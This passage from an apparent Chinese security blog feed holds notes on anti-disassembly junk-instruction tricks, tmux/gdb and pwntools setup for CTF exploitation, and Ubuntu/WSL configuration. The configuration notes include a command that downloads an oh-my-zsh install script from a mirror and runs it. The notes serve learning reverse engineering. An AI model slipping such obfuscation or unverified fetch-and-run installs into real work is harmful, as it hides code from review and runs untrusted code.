class="hljs-symbol">label2:</span><br><span class="hljs-keyword">jmp</span> label3<span class="hljs-comment">;</span><br>__emit <span class="hljs-number">0xe8</span><span class="hljs-comment">;</span><br><span class="hljs-symbol">label3:</span><br>&#125;<br></code></pre></td></tr></table></figure><p>​算是基础的花指令，很容易看出来</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401282032164.png" alt="image-20240128203257130" /></p><h1 id="call-function"><a class="markdownIt-Anchor" href="#call-function"></a> Call Function</h1><p>​反汇编器会线性扫描 call 下一条指令，而延迟对function的内容反汇编，所以只要在call之后插入一些垃圾代码，并在function中改掉返回地址即可。</p><blockquote><p>对于foo的构建需要考虑原本的push esp和一些函数框架，只需要通过ebp操作返回地址即可。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">foo</span><span class="hljs-params">()</span> &#123;<br>    __asm <br>    &#123; <br>        __asm mov eax, dword ptr[ebp + <span class="hljs-number">4</span>] \ <span class="hljs-comment">// 获取函数的返回地址</span><br>        __asm add eax, <span class="hljs-number">1</span> \<br>        __asm mov dword ptr[ebp + <span class="hljs-number">4</span>], eax \<br>        <span class="hljs-comment">// 这里将函数的返回地址修改一下，跳过了之后的 __emit 0xe8，从而让程序在执行时正常</span><br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>__asm &#123;<br>        call foo<br>        __emit <span class="hljs-number">0xE8</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​这里上面的 call 是 foo 函数，下面的则是被 0xE8 误导的结果</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401282013159.png" alt="image-20240128201322133" /></p><p>​但是还有瑕疵，这里在反汇编器中会直接暴露 foo 的调用，然后通过分析 foo 函数来理清楚逻辑。所以将call foo 分解为 <code>call S 和 jmp</code> 或是 <code>push foo、pop eax</code>。这里 <code>call、jmp eax</code> 会被ida识别。</p><h1 id="return"><a class="markdownIt-Anchor" href="#return"></a> Return</h1><p>​ret从栈顶获取数据，并且修改IP，所以即便是干扰反汇编，也是和call指令成对出现，但是出现ret会让反汇编器<br />终止，并转去处理延迟反汇编的数据，干扰函数代码识别。</p><blockquote><p>call和ret出现，一般都会对ip进行修改或者插入一些垃圾代码。</p></blockquote><p>​下面首先使用 call 把 label1 地址压栈，然后执行label1之后的指令，其中 add 指令使堆栈下降5，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">__asm &#123; <br>    call label1<br>label1:<br>    add dword ptr[esp], 5<br>    ret<br>&#125;<br></code></pre></td></tr></table></figure><p>​这里就是识别到 retn 之后的指令就不作为这个基本块的后续了，反编译失败</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401281940961.png" alt="image-20240128194027916" /></p><h1 id="other"><a class="markdownIt-Anchor" href="#other"></a> Other</h1><p>​来自VNCTF的一个指令，融合了条件跳转和ret。这里首先将eax值设置为4，之后mul为16，因为call $+5压入了mul处的地址，retn后会跳到mul的位置执行 mul eax 即16x16=0100，满jz跳转，跳出循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">__asm &#123; <br>    push eax<br>    xor eax,eax<br>    xor eax,<span class="hljs-number">4</span><br>    call label1 <span class="hljs-comment">//识别成--&gt; call $+5</span><br>label1:<br>    mul eax<br>    cmp eax,<span class="hljs-number">0x100</span><br>    jz label2<br>    retn<br>label2:<br>    pop eax<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401282029092.png" alt="image-20240128202933062" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401282029549.png" alt="image-20240128202949522" /></p>]]></content>
    
    
    <categories>
      
      <category>逆向笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn相关配置</title>
    <link href="/posts/98d6e652.html"/>
    <url>/posts/98d6e652.html</url>
    
    <content type="html"><![CDATA[<h1 id="tmux配置"><a class="markdownIt-Anchor" href="#tmux配置"></a> Tmux配置</h1><p>​借用一下别人的关系图展示session，window，pane的关系。这里是<a href="https://louiszhai.github.io/2017/09/30/tmux/">tmux使用手册</a>，下面有一些常用的快捷键。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402151938660.png" alt="image-20240215193845523" /></p><h2 id="session"><a class="markdownIt-Anchor" href="#session"></a> session</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建session</span><br>tmux new -s session_name<br><span class="hljs-meta prompt_"># </span><span class="language-bash">继续使用session</span><br>tmux attach -t session_name<br><span class="hljs-meta prompt_"># </span><span class="language-bash">关闭session</span><br>Ctrl-a d<br><span class="hljs-meta prompt_"># </span><span class="language-bash">列举所有的session</span><br>tmux ls<br><span class="hljs-meta prompt_"># </span><span class="language-bash">杀死所有的session</span><br>tmux kill-server<br><span class="hljs-meta prompt_"># </span><span class="language-bash">杀死对应的session</span><br>tmux kill-session -t session_name<br></code></pre></td></tr></table></figure><h2 id="window"><a class="markdownIt-Anchor" href="#window"></a> window</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">Ctrl-a c# 创建新的窗口<br>Ctrl-a &amp;# 关闭当前窗口<br>Ctrl-a n# 到写一个窗口<br>Ctrl-a p# 到上一个窗口<br>Ctrl-a f# 切换窗口<br>Ctrl-a ,# 重命名窗口<br></code></pre></td></tr></table></figure><h2 id="pane"><a class="markdownIt-Anchor" href="#pane"></a> pane</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">Ctrl-a |# 左右分屏<br>Ctrl-a -# 上下分屏<br>Ctrl-a x# 关闭当前pane，或者exit也可以<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/luhao19980909/article/details/89718899#:~:text=ctrl%20%2B%20a%20%E6%9D%BE%E6%89%8B%E6%8C%89%20%22%20%23%E4%B8%8A%E4%B8%8B%E5%88%86%E5%B1%8F%20ctrl%20%2B,%2B%20a%20%E6%9D%BE%E6%89%8B%E6%8C%89%20%26%20%23%E5%85%B3%E9%97%AD%E6%89%80%E6%9C%89%E7%AA%97%E5%8F%A3%20exit%20%23%E5%85%B3%E9%97%AD%E5%BD%93%E5%89%8D%E7%AA%97%E5%8F%A3%201">分屏命令总结</a></p><h2 id="其余操作"><a class="markdownIt-Anchor" href="#其余操作"></a> 其余操作</h2><ul><li>复制</li><li>直接鼠标左键选中就复制到剪切板中了，使用 <code>crtl + v</code> 进行粘贴</li></ul><h1 id="gdb调试"><a class="markdownIt-Anchor" href="#gdb调试"></a> gdb调试</h1><p>​需要在tmux中执行python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 打开一个全新的窗格</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;new-window&#x27;</span>]<br><span class="hljs-comment"># 下面两个相同，都是打开一个水平分割的窗格</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-F&#x27;</span> <span class="hljs-string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="hljs-string">&#x27;-P&#x27;</span>]<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-comment"># gdb调试</span><br>gdb.attach(p)<br>gdb.debug(binary_path)<br>pause() <span class="hljs-comment"># 暂停进行调试</span><br></code></pre></td></tr></table></figure><h1 id="other"><a class="markdownIt-Anchor" href="#other"></a> Other</h1><ul><li>gcc/g++ 版本切换<ul><li><a href="https://www.cnblogs.com/jamesnulliu/p/5_Steps_to_Use_Cxx20_in_Ubuntu22.html">5 步在 Ubuntu22 上使用 C++20 - JamesNULLiu - 博客园 (cnblogs.com)</a></li><li>这里需要注意在后面进行多版本控制时，g++的目录写错了，注意自己修改一下，不然它的版本还是不变</li><li>这里配置的目的已经忘了是什么了，但是新下载的gcc-13编译32位程序会报错，而原生的gcc-11不会报错，所以可以通过设置优先级来进行切换gcc。</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Pwn笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu和Wsl配置</title>
    <link href="/posts/a0244f85.html"/>
    <url>/posts/a0244f85.html</url>
    
    <content type="html"><![CDATA[<h1 id="下载安装类"><a class="markdownIt-Anchor" href="#下载安装类"></a> 下载安装类</h1><h2 id="虚拟机下载"><a class="markdownIt-Anchor" href="#虚拟机下载"></a> 虚拟机下载</h2><p><a href="https://huaweicloud.csdn.net/63560351d3efff3090b58aa7.html?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~activity-2-120698714-blog-107017669.pc_relevant_vip_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~activity-2-120698714-blog-107017669.pc_relevant_vip_default&amp;utm_relevant_index=1">VMware虚拟机安装Ubuntu20.04详细图文教程</a></p><p><a href="https://blog.csdn.net/m0_72237413/article/details/125477492">Kubuntu 22.04的安装及基本配置</a></p><ul><li><p>这里按照教程下载安装，然后换源即可</p><ul><li><p>对于有GUI界面的Ubuntu而言，换源可以直接在设置中选择位于中国的服务器</p></li><li><p>对于没有GUI界面，需要查找相对应的源，这里注意，不同Linux的源不一样，</p><p>谨慎换源操作</p><ul><li>换源版本需要准确 <a href="https://zhuanlan.zhihu.com/p/357751721">ubuntu20.04 CUDA10.2 安装避坑 - 知乎 (zhihu.com)</a></li></ul></li></ul></li></ul><h2 id="vmtools下载"><a class="markdownIt-Anchor" href="#vmtools下载"></a> VmTools下载</h2><p><a href="https://blog.csdn.net/dengjin20104042056/article/details/106396644">Ubuntu安装VMware Tools</a></p><ul><li>两种方法，建议使用命令行安装</li><li>有的情况是安装完了虚拟机，然后VmTools就直接安装好了</li></ul><h2 id="pip3下载和换源"><a class="markdownIt-Anchor" href="#pip3下载和换源"></a> <strong>pip3下载和换源</strong></h2><p><a href="https://blog.csdn.net/qintaiwu/article/details/89393028">Ubuntu安装pip3工具</a></p><ul><li>如果发现升级显示成功，但是最后版本不变，可以试试再运行目录中看看有没有<code>version</code>文件，将此文件删除即可更新</li></ul><p><a href="https://blog.csdn.net/limengshi138392/article/details/111315014">ubuntu修改python的pip源为国内源</a></p><h2 id="python虚拟环境"><a class="markdownIt-Anchor" href="#python虚拟环境"></a> <strong>python虚拟环境</strong></h2><ul><li><p>可以使用workon直接进入，不需要被目录限制(拥有包管理工具)</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">virtualenvwrapper</span><br></code></pre></td></tr></table></figure><ul><li><a href="https://blog.csdn.net/lxb_wyf/article/details/116122087">python虚拟环境</a></li><li><a href="https://blog.csdn.net/u011817217/article/details/102662307">使用pip命令安装第三方包时报错</a></li><li>安装出错大概率与pip的源相关(下载速率)，此时使用临时换源的方式进行安装<ul><li>补充：<code>ipython</code> 可以直接pip3进行安装</li><li><code>pip3 install ipython</code>只要python安装后，虚拟环境中也可以用</li></ul></li><li>这里需要注意，它只是管理器，如果想要其余版本的python，还是需要从官网上去下载，然后它可以去管理。综合考虑还是很繁琐的。</li></ul></li><li><p>可以直接下载 Anaconda，但是这玩意实在是太大了，建议考虑miniconda(推荐这个)</p></li></ul><h2 id="版本不匹配"><a class="markdownIt-Anchor" href="#版本不匹配"></a> <strong>版本不匹配</strong></h2><ul><li>lib6-dev<ul><li>依赖的版本不对，建议不要盲目的降版本，很可能导致ubuntu打不开也关不了</li></ul></li><li>bits/libc-header-start.h<ul><li>报错原因：使用了 <strong>m32</strong> 指令，而 64 位系统 GCC 默认安装环境无法直接编译生成 32 位程序</li></ul></li></ul><p><a href="https://askubuntu.com/questions/1387067/usr-include-stdio-h2710-fatal-error-bits-libc-header-start-h-no-such-file">问题论坛</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装aptitude</span><br>$ sudo apt-get install aptitude<br><span class="hljs-comment"># 通过安装的形式查看无法安装的软件/依赖库的依赖,lib6-dev选择第一个即可，gcc-multilib选择第二个方案(先No，再Yes)</span><br>$ sudo apt-get install XXXX<br></code></pre></td></tr></table></figure><h1 id="便捷配置"><a class="markdownIt-Anchor" href="#便捷配置"></a> 便捷配置</h1><h2 id="apt安装卸载"><a class="markdownIt-Anchor" href="#apt安装卸载"></a> apt安装/卸载</h2><p><a href="https://blog.csdn.net/LEON1741/article/details/85114318">apt命令删除/卸载软件包（remove/clean/purge）</a></p><h2 id="vscode连接ubuntu"><a class="markdownIt-Anchor" href="#vscode连接ubuntu"></a> <strong>vscode连接ubuntu</strong></h2><p><a href="https://blog.csdn.net/u014240299/article/details/105000312">Ubuntu安装openssh-server</a></p><p><a href="https://blog.csdn.net/nnyQQ/article/details/115671346">vscode连接</a></p><h2 id="vscode无密钥连接ubuntu"><a class="markdownIt-Anchor" href="#vscode无密钥连接ubuntu"></a> vscode无密钥连接ubuntu</h2><p>直接使用<strong>git bash</strong>，在<code>C:\\Users\\用户名\\.ssh</code>中输入 <code>ssh-copy-id -i ./id_rsa.pub 虚拟机名称@ip</code>然后就可以了，需要哪个用户无密码登录就更换名字</p><h2 id="配置zsh"><a class="markdownIt-Anchor" href="#配置zsh"></a> 配置ZSH</h2><p>主题配置 -&gt; <a href="https://www.haoyep.com/posts/zsh-config-oh-my-zsh/">Zsh 安装与配置，使用 Oh-My-Zsh 美化终端 | Leehow的小站 (haoyep.com)</a></p><p><a href="https://regding.github.io/ubuntu-zsh">使用 Zsh 作为 Ubuntu 的默认 Shell (regding.github.io)</a></p><p><a href="https://www.cnblogs.com/langkyeSir/p/13906461.html">安装Oh-My-Zsh-国内地址</a></p><p><a href="https://blog.csdn.net/Jonder_wu/article/details/100529721">ZSH–agnoster主题乱码问题_“zsh_theme=“agnoster” 乱码”</a></p><ul><li>使用国内镜像下载——只有这个可以连接成功</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sh -c <span class="hljs-string">&quot;<span class="hljs-subst">$(curl -fsSL &lt;https://gitee.com/shmhlsy/oh-my-zsh-install.sh/raw/master/install.sh&gt;)</span>&quot;</span><br></code></pre></td></tr></table></figure><h2 id="程序执行"><a class="markdownIt-Anchor" href="#程序执行"></a> 程序执行</h2><h3 id="执行32位可执行文件"><a class="markdownIt-Anchor" href="#执行32位可执行文件"></a> 执行32位可执行文件</h3><p><a href="https://blog.csdn.net/kingroc/article/details/51143327">参考博客</a></p><ul><li><p>下载的ubuntu一般都为64位版本，执行32位的需要安装支持32位程序的二进制库，若没有安装，使用<code>./filename</code>执行会显示无法找到文件</p></li><li><p>可以使用<code>file [文件的路径]</code>来查看文件属性</p></li><li><p>若是显示</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">bash: ./[<span class="hljs-built_in">file</span>]: 权限不够<br></code></pre></td></tr></table></figure><ul><li>需要使用<code>chmod +x file</code>或者<code>chmod 777 file</code>来使文件可以执行</li></ul></li></ul><h2 id="配置-git"><a class="markdownIt-Anchor" href="#配置-git"></a> 配置 GIT</h2><p>​git失败的原因绝大多数都是网络问题，所以挂代理是最为推荐的选择。以下是起作用的一些方法</p><ul><li><p>通用方法，更换git的代理为443</p><ul><li><a href="https://www.cnblogs.com/tsalita/p/16181711.html">SSH：连接到主机github.com端口22：连接时间超时</a></li></ul></li><li><p>但是对于wsl，直接使用最新wsl2共用主机的代理即可(<strong>最为推荐</strong>)，不嫌麻烦可以给配置个代理</p><ul><li><a href="https://github.com/microsoft/WSL/issues/10753">配置wsl镜像</a></li><li><a href="https://wph.im/199.html">Windows10系统下配置WSL2自动走Clash代理</a>，之后clash打开allow lan模式即可</li><li><a href="https://nafx.top/archives/88ca14b9#5-etc-resolv-conf%E9%87%8D%E5%90%AF%E4%B8%A2%E5%A4%B1">WSL2内使用Windows的v2ray代理 | Nafx’s Blog</a>，这是v2的模式，首先最后面设置，然后前面配置bashrc</li></ul></li><li><p>有时候最后的方法会起点作用</p><ul><li><a href="https://blog.csdn.net/m0_38068229/article/details/108205928">git clone失败解决方案</a></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn相关小技巧</title>
    <link href="/posts/9fc4ccba.html"/>
    <url>/posts/9fc4ccba.html</url>
    
    <content type="html"><![CDATA[<h1 id="模板"><a class="markdownIt-Anchor" href="#模板"></a> 模板</h1><h2 id="通常"><a class="markdownIt-Anchor" href="#通常"></a> 通常</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 配置框架</span><br><span class="hljs-comment">#context(arch = &#x27;i386&#x27; , os = &#x27;linux&#x27;, log_level=&quot;debug&quot;) # 32位结构</span><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>file_name = <span class="hljs-string">&#x27;./file&#x27;</span><br>elf = ELF(file_name)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc-2.31.so&#x27;)</span><br><br><span class="hljs-comment"># 选择模式</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">mode = <span class="hljs-number">1</span></span>):<br>    <span class="hljs-keyword">if</span> mode:<br>        <span class="hljs-keyword">return</span> process(file_name)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> remote(<span class="hljs-string">&#x27;111.222.333.444&#x27;</span>, <span class="hljs-number">32265</span>)<br><br><span class="hljs-comment"># 调试程序</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">p, mode = <span class="hljs-number">1</span></span>):<br>    <span class="hljs-keyword">if</span> mode == <span class="hljs-number">1</span>:<br>    gdb.attach(p)<br>    <span class="hljs-keyword">else</span>:<br>        gdb.debug(file_name, <span class="hljs-string">&#x27;break main&#x27;</span>)<br>        <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    p = test(<span class="hljs-number">1</span>)<br>    dbg(p)<br>    p.interactive()<br></code></pre></td></tr></table></figure><h1 id="利用资源"><a class="markdownIt-Anchor" href="#利用资源"></a> 利用资源</h1><h2 id="系统调用表"><a class="markdownIt-Anchor" href="#系统调用表"></a> 系统调用表</h2><p><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Linux System Call Table for x86 64 · Ryan A. Chapman (rchapman.org)</a></p><p><a href="https://blog.csdn.net/Nashi_Ko/article/details/120288385">Linux X86架构 32 系统调用表_32位 syscall-CSDN博客</a></p><h1 id="一些工具"><a class="markdownIt-Anchor" href="#一些工具"></a> 一些工具</h1><h2 id="strace"><a class="markdownIt-Anchor" href="#strace"></a> Strace</h2><ul><li><strong>Strace</strong> <strong>用于检查一个应用程序所使用的系统调用以及它所接收的系统信息</strong> 。strace会追踪程序运行时的整个生命周期，输出每一个系统调用的名字、参数、返回值和执行所消耗的时间等，是高级运维和开发人员排查问题的杀手铜</li><li><a href="https://zhuanlan.zhihu.com/p/106890931">Linux程序调试工具工具—strace命令 - 知乎 (zhihu.com)</a></li></ul><h2 id="ltrace"><a class="markdownIt-Anchor" href="#ltrace"></a> ltrace</h2><ul><li><strong>ltrace 能够跟踪进程的库函数调用</strong> ，它会显现出调用了哪个库函数，而 <strong>strace则是跟踪进程的每个系统调用</strong></li><li><a href="https://zhuanlan.zhihu.com/p/107063011">Linux库函数调用工具—ltrace命令 - 知乎 (zhihu.com)</a></li></ul><p><a href="https://www.yanbinghu.com/2018/05/28/26708.html">系统调用和库函数的区别 | 守望的个人博客 (yanbinghu.com)</a></p><h2 id="cyclic"><a class="markdownIt-Anchor" href="#cyclic"></a> cyclic</h2><p>​cyclic 命令是一个可以随机生成一串字符串的命令，后面直接加数字可以生成相应数字长度的字符串。同时可以通过 <code>-l + 4个字符</code> 计算这4个字母之前有几个字符。这样就可以通过输入过长的字符而报错来计算出栈溢出的大小(栈大小 + push rsp)。</p><h2 id="ropgadget"><a class="markdownIt-Anchor" href="#ropgadget"></a> ROPgadget</h2><p>​利用方式如下，它用来寻找含有特定汇编指令的地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary file_name --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Pwn笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一些资源</title>
    <link href="/posts/fd6916f2.html"/>
    <url>/posts/fd6916f2.html</url>
    
    <content type="html"><![CDATA[<h1 id="操作系统镜像"><a class="markdownIt-Anchor" href="#操作系统镜像"></a> 操作系统镜像</h1><ul><li><p>这个网站可以百度网盘下载<a href="https://msdn.sjjzm.com/win10/1903.html">Windows 10 1903 - MSDN - 山己几子木 (sjjzm.com)</a></p></li><li><p>这是吾爱破解的地址，上面有对于种子文件的加速处理方法<a href="https://www.52pojie.cn/thread-1033069-1-1.html">求一个win10的镜像</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>周报</title>
    <link href="/posts/594d9f6c.html"/>
    <url>/posts/594d9f6c.html</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c63df4f63ee89650670090b6321468ada6222ed7bbdaa52c938135d5f621f2ce">f0c149f72439c7ef7e2db179cea9a9dcbbe80016fd284dde4b75bd58a8c33697be6a94f26a23354049d1ae015b338cb45da001f8affe8759ae490994949febbd3bed693fd5a7c71e2ed646bfd2b719df26dcfa5abe556ab24155abf444d0a50aa42766cae2c3122f06a5765b7e1bc74bd7a888cf1066497c16cf4d148e4dd1c81a9301f98ce0fd782dae6bf3a16da776b101b21806294f3cb4215ffe0b00d037d8960048775ba8c155f16978ac1db929969eb2d20a1bf3d49c59a10f3a11384949f545bd0e697f1f4a0a5fc238e5de070d79c0b9758049773af5e92e3e566e5f3b825a04d9ded36f8a32035dbdff93ca8eb062aa9c0811a5a2099f5dba2c6f216285bcf26f454ecb7cad29d513dce63ccc48642147802226297aeb7d2a6810b62ed2d2141532922f93c79164f701abb740e952375708619595e9ef0434215bd02476ce0a6a1ca654a2c080c18d7143d1c52d9ca3dbdefb36d26624356e27b64ba2fd389825e725c8ad77a76306dc0062670c6eaa21334593b91b5a6c272cfe598e870b088fe772e3376876f89aeea5cca6482982592fe325a99ba4334fbabfb449761ff9bf9f11b2dd58e458e3f549c41fd32ff291921a10ae76ba70a48a73458a1f97cf79deb0a467e2d66aaebd361283b9897e649697f6f6157883c70c7986150c8ae40020d908afb220e662dcb910e25e71764cecf2dbc230aa017958163fb04851512b2a268dd161e3b47bfd13c75d7ffea8929282d1c593ac4a031faaaf528cc46fb02d9dd2bbbede9ce08acffae5c12074292394c87c168026371446623ce195173a71366ceab4a1856ccef5ec83fef472bef92a4e5af9c9a98a64a9a1e519429349b6478d3b9c97434da2b5e434ad4aa56e51319ee2d1bae9d5c7461fa1c6088983771c21c8dae761502f27ecfcc91aba10c5a36029fab99161d3695b120eccda58d4cc250830fd50a8cd623655b6f01274d07ce36151bf038e8e1d8faecfa1a0968dc8dfac414dacf60ab519138314849656bf6067a410d4af39539932ec5c6798b526303654503564a87627435bed93593920cc2255f2905d247a002208d1a9f1fa4d98ff40430e13fd25046f539f6264646441285f248d491c165f8588008342e8ad39b0b996e3053a8fc8f6f70f1d2725063a0d311855e0ec51a6c04e54d7944bcc8c96f8027b09c50cc9b28d63f4f46f45c2b4e2fcdabe4bd9dfeb962b409b38a9c4cd88ed3d2e220c0ed6e7488ef49be724528d0771b780418c24d3ff3d352fc4d737889b68451095a3d51e1f5d81ab6dfda56a0f64f4fe68e79bfa0f6076f8c0f3d62247d614ac60a52cf52d242f7b08e8421817706ac5ef057768b22287c8bd2aa51fa0bd48953c49b3dd8afa0e5f7279ad6d4fb086d31bd2c3ed9c66c6a1c2dc22e5d037e65259f403449c1aa5a70100424e54d51739e9322e196ca514b78b5db21b4529404f4c41558a9d13f1fa9c9c0e08eaed32712cdf8aa0a6c4e6929ac06764bf34dbe923606c3fb38512cba1916d7022f3198d0fbcc6aafc8fe403aee051e4ec4c0ac9c1dac8e927fb0150c22f3cf52c8cf7114a5c43dff76a60120b2272e8b7a89bd8a81b47858333734204d303480f5e419ae561b4d0a9c0b46673a107cdc5ba2ae9a42f59b16021c4a029e033b54594b5ace03527c83ca643980a5fb629187f41aaced47ca09e5ecb93eb8d7d35075ea235be1d71edfb62ebf50f6d814bb0e2a808bea00b5389dc7ad36bb5c889c7e408cc2c0479c3653d4cf0d1c769dfc25ac07dc2a4eecf8be0485afcdeebd8a74533e67d5af2af553271265b81bfcce653ecbb9bf4b72f6f921799e1f4df9ddf2e293347ee94e4985989df18bf88d837d46c12e6f9c1a676b88f06a7a765b5a6f77fd43a6deb92a422ce29fac8566b8b07f579fd82b5c5abc73b11c5bd71cbb9c469df25475efc39b29d4f04634c3ca660b4a200f01570038cedb2e12e632187cd6efaf1c43500afe1d6e82956f4154f4a16fc0cf8156437ce4795231a08b95cd1f034448bc07dd568cf46dd8863ad65e1aa6e3ff7c29271781142bd5d7a0c8af63e16d572aba8f5b8ac3f80fd3c1f0c973804e9c8533d7127b2364b7b39e744bdf4ba0ba62ccab718ab08cf8d4b78dfdec0fca1e081198e4c186e3b8950cf597b9f9e435f852071e4ec9be4aff9cb54914b66582afc515be979b3db808956131c08b52b09354b096da1571e3ad5d5c463240195e5b8308db6b2b47e1b0310a6afefa222eae5e455718c7e4d0cba6e65907b135bcad77eae8ba5f07e74735f180dc6e4ce27472496abe0f3676369ce9291653bd8e925576330ef9a87cd21a928ef3ba89c8dfa5c21e7a7b627b51e773ca8f325f5215d3be3a56c1db67f2ffbf7783977b00e57dd3862c95883b55e18df5021bb49ce863096ef0738a7954935cccccea401a9e1a46631d78464fe423c6336b2479bb04e8af192c7297bf810560d12bf64c233afaba8f97b0ed4595